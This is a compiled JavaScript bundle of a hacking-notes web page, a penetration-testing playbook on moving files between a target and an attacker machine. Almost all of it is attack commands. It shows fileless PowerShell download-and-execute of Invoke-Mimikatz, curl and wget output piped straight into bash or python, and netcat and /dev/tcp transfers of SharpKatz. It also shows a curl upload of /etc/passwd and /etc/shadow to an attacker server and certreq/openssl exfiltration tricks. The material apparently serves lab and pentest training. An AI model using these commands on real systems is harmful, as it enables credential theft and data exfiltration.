"use strict";(self.webpackChunkhacking=self.webpackChunkhacking||[]).push([[8668],{1568:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>l,toc:()=>c});var t=s(5893),r=s(1151);const a={slug:"/playbooks/file-transfer",pagination_next:null,pagination_prev:null},i=void 0,l={id:"Hacking/Playbooks/File transfer",title:"File transfer",description:"How to extract/send files from the machines to the attacker machine.",source:"@site/docs/Hacking/Playbooks/File transfer.md",sourceDirName:"Hacking/Playbooks",slug:"/playbooks/file-transfer",permalink:"/docs/playbooks/file-transfer",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{slug:"/playbooks/file-transfer",pagination_next:null,pagination_prev:null},sidebar:"tutorialSidebar"},o={},c=[{value:"Base64 encode/decode",id:"base64-encodedecode",level:2},{value:"Powershell",id:"powershell",level:2},{value:"Samba",id:"samba",level:2},{value:"ftp",id:"ftp",level:2},{value:"wget",id:"wget",level:2},{value:"curl",id:"curl",level:2},{value:"nc",id:"nc",level:2},{value:"dev/tcp",id:"devtcp",level:2},{value:"python",id:"python",level:2},{value:"Self-signed certificate",id:"self-signed-certificate",level:2},{value:"Living off The Land",id:"living-off-the-land",level:2}];function h(e){const n={a:"a",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.p,{children:"How to extract/send files from the machines to the attacker machine."}),"\n",(0,t.jsxs)(n.p,{children:["See ",(0,t.jsx)(n.a,{href:"https://academy.hackthebox.com/module/24",children:"https://academy.hackthebox.com/module/24"})," or ",(0,t.jsx)(n.a,{href:"https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration",children:"https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration"}),"\nfor complete reference"]}),"\n",(0,t.jsx)(n.h2,{id:"base64-encodedecode",children:"Base64 encode/decode"}),"\n",(0,t.jsx)(n.p,{children:"If the payload to transmit is small enough, do base64 encode/decode and later check md5 hashes match"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"base64 -w0 <file> #Encode file\nbase64 -d file #Decode file\n"})}),"\n",(0,t.jsx)(n.h2,{id:"powershell",children:"Powershell"}),"\n",(0,t.jsxs)(n.p,{children:["Complete reference: ",(0,t.jsx)(n.a,{href:"https://gist.github.com/HarmJ0y/bb48307ffa663256e239",children:"https://gist.github.com/HarmJ0y/bb48307ffa663256e239"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n"})}),"\n",(0,t.jsx)(n.p,{children:"Fileless method: it does not touch the disk"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n"})}),"\n",(0,t.jsx)(n.p,{children:"Upload, powershell does not have a native cmdlet to perform HTTP uploads, however we can install this feature"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nInvoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n"})}),"\n",(0,t.jsx)(n.p,{children:"Upload with base64:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nInvoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n"})}),"\n",(0,t.jsx)(n.p,{children:"Upload via FTP:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n"})}),"\n",(0,t.jsx)(n.h2,{id:"samba",children:"Samba"}),"\n",(0,t.jsx)(n.p,{children:"Start a impacket samba server on the attacker machine:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo impacket-smbserver share -smb2support /tmp/smbshare\nsudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n"})}),"\n",(0,t.jsx)(n.p,{children:"Note: the folder will not be created automatically, so you might want to create it beforehand."}),"\n",(0,t.jsx)(n.p,{children:"Then to download a file from the attack machine to the target machine:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"copy \\\\192.168.220.133\\share\\nc.exe\n"})}),"\n",(0,t.jsx)(n.p,{children:"Or to upload a file from the target machine to the attack machine"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"copy upload_win.txt \\\\192.168.220.133\\share\n"})}),"\n",(0,t.jsx)(n.p,{children:"If the samba ports are blocked, it's worth trying with WebDAV which runs SMB over HTTP."}),"\n",(0,t.jsx)(n.p,{children:"Attacker machine:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo pip install wsgidav cheroot\nsudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n"})}),"\n",(0,t.jsx)(n.p,{children:"Target machine:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"dir \\\\192.168.49.128\\DavWWWRoot\ncopy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n"})}),"\n",(0,t.jsx)(n.p,{children:"Note: `DavWWWRoot`` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server."}),"\n",(0,t.jsx)(n.p,{children:"You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \\192.168.49.128\\sharefolder"}),"\n",(0,t.jsx)(n.h2,{id:"ftp",children:"ftp"}),"\n",(0,t.jsx)(n.p,{children:"Start a FTP server in the attacker:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo pip3 install pyftpdlib\nsudo python3 -m pyftpdlib --port 21\n"})}),"\n",(0,t.jsx)(n.p,{children:"By default it will try to run at port 2121, so we need to explicitly say port 21 (and sudo)."}),"\n",(0,t.jsx)(n.p,{children:"At the target machine, we can use powershell cmdlet:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n"})}),"\n",(0,t.jsx)(n.p,{children:"If the shell is not interactive, we'll need to create a file with the FTP commands, e.g.:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"C:\\htb> echo open 192.168.49.128 > ftpcommand.txt\nC:\\htb> echo USER anonymous >> ftpcommand.txt\nC:\\htb> echo binary >> ftpcommand.txt\nC:\\htb> echo GET file.txt >> ftpcommand.txt\nC:\\htb> echo bye >> ftpcommand.txt\nC:\\htb> ftp -v -n -s:ftpcommand.txt\nftp> open 192.168.49.128\nLog in with USER and PASS first.\nftp> USER anonymous\n\nftp> GET file.txt\nftp> bye\n\nC:\\htb>more file.txt\nThis is a test file\n"})}),"\n",(0,t.jsx)(n.h2,{id:"wget",children:"wget"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\n# fileless wget\nwget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n"})}),"\n",(0,t.jsx)(n.h2,{id:"curl",children:"curl"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n# fileless curl\ncurl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nc",children:"nc"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"nc -lvnp 9002 > SharpKatz.exe #Inside receiver\nnc -q 0 192.168.49.128 9002 < SharpKatz.exe #In sender\n"})}),"\n",(0,t.jsx)(n.h2,{id:"devtcp",children:"dev/tcp"}),"\n",(0,t.jsx)(n.p,{children:"As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'exec 3<>/dev/tcp/10.10.10.32/80\necho -e "GET /LinEnum.sh HTTP/1.1\\n\\n">&3\ncat <&3\n\ncat metabase.db.trace.db > /dev/tcp/10.10.14.102/9002 # Send the file\ncat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe # Receive the file\n'})}),"\n",(0,t.jsx)(n.h2,{id:"python",children:"python"}),"\n",(0,t.jsx)(n.p,{children:"Attacker machine runs HTTP(s) server"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo python3 -m pip install --user uploadserver\npython3 -m http.server 5555\nsudo python3 -m uploadserver 443 --server-certificate /root/server.pem\n"})}),"\n",(0,t.jsx)(n.p,{children:"Target machine uploads file:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n"})}),"\n",(0,t.jsx)(n.h2,{id:"self-signed-certificate",children:"Self-signed certificate"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n"})}),"\n",(0,t.jsx)(n.h2,{id:"living-off-the-land",children:"Living off The Land"}),"\n",(0,t.jsx)(n.p,{children:"You can abuse of binaries supposed to perform an action to escape from some prohibited binaries. This is same concept as the privilege escalation using GTFObins."}),"\n",(0,t.jsx)(n.p,{children:"You can use:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.a,{href:"https://lolbas-project.github.io/#",children:"https://lolbas-project.github.io/#"})," for windows"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.a,{href:"https://gtfobins.github.io/",children:"https://gtfobins.github.io/"})," for Linux"]}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["For example, for Windows we can use ",(0,t.jsx)(n.code,{children:"certreq.exe"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"certreq.exe -Post -config http://192.168.49.128/ c:\\windows\\win.ini\n"})}),"\n",(0,t.jsxs)(n.p,{children:["For example in Linux, you can abuse ",(0,t.jsx)(n.code,{children:"openssl"}),":"]}),"\n",(0,t.jsx)(n.p,{children:"On attacker:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\nopenssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh\n"})}),"\n",(0,t.jsx)(n.p,{children:"On target:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh\n"})})]})}function d(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(h,{...e})}):h(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>l,a:()=>i});var t=s(7294);const r={},a=t.createContext(r);function i(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);